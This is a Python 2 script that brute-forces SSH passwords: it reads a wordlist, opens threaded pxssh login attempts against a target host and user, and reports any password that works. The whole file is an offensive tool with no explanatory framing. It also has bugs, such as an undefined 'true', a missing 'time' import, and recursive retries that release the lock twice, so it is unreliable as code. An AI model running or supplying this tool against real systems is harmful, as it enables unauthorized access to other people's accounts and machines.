import pxssh
import optparse
from threading import *
maxConn=5
conn_lock=BoundedSemaphore(value=maxConn)
found=False
fails=0

def send_command(s,cmd):
	s.sendline(cmd)
	s.prompt()
	print s.before

def connect(host,user,password):
	global found
	global fails

	try:
		s=pxssh.pxssh()
		s.login(host,user,password)
		print '[+] Passowrd found! '+password
		#return s
		found=true
	except Exception, e:
		if 'read_nonblocking' in str(e):
			fails+=1
			time.sleep(5)
			connect(host,user,password)
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			connect(host,user,password)
	finally:
		 conn_lock.release()
		

def main():
	parser=optparse.OptionParser("usage: %prog -H <host> -U <user> -P <password>")
	parser.add_option('-H',dest='shost',type='string',help='target host')
	parser.add_option('-U',dest='suser',type='string',help='user name')
	parser.add_option('-P',dest='spass',type='string',help='password')
	(options,args)=parser.parse_args()
	if (options.shost==None)|(options.suser==None)|(options.spass==None):
		print parser.usage
		exit(0)
	fn=open(options.spass , 'r')
	for line in fn.readlines():
		if found:
			print "[*] Exiting : password found"
			exit(0)
		if fails > 5:
			print "[!] Exiting : too many time outs"
			exit(0)
		conn_lock.acquire()
		password=line.strip('\r').strip('\n')
		print "[-] Testing " + str(password)
		t=Thread(target=connect , args=(options.shost,options.suser,password))
		t.start()


if __name__=='__main__':
	main()
